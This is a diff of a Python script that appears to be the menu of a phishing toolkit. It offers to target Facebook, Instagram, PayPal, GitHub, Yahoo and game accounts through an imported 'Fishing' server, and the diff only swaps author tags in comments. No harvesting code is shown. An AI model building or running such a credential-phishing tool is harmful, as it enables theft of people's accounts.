@@ -1,14 +1,14 @@
 #!/usr/bin/python
-#########################7x
+#########################Moodi 
 import time, os, threading
 from tools.Fishing.server import Fishing, db_File
 from MoodiStyle import Animation as A , G ,Text
 from MoodiStyle import Style
-#########################7x
+#########################Moodi 
 class App:
     @property
     def user(self):
-        ######7x
+        ######Moodi 
         print ("\033[1;31m _______ _________ _______          _________ _        _______")
         print ("\033[1;31m(  ____ \\\\__   __/(  ____ \\|\\     /|\\__   __/( (    /|(  ____ \\")
         print ("\033[0;31m| (    \\/   ) (   | (    \\/| )   ( |   ) (   |  \\ (  || (    \\/")
@@ -23,7 +23,7 @@ class App:
         SA = ['R#[G#1R#] C#FaceBook Accounts','R#[G#2R#] C#Instagram Accounts','R#[G#3R#] C#Paypal Accounts','R#[G#4R#] C#Github Accounts','R#[G#5R#] C#Yahoo Accounts','R#[G#6R#] C#Clash Of Clans Accounts','R#[G#7R#] C#PUBG Mobile Accounts','C#Available SoOoN..!'] 
         S = Style(*SA).Square(cols=2,padding_x=1,padding_y=1)
         print(S)
-        ######7x
+        ######Moodi 
         print ("\033[1;36mTelegram >> \033[1;33mhttps://t.me/Arab_heroes ")
         text = Text('B#[C#*B#] Enter Number C#:W# ')
         page = input(text)
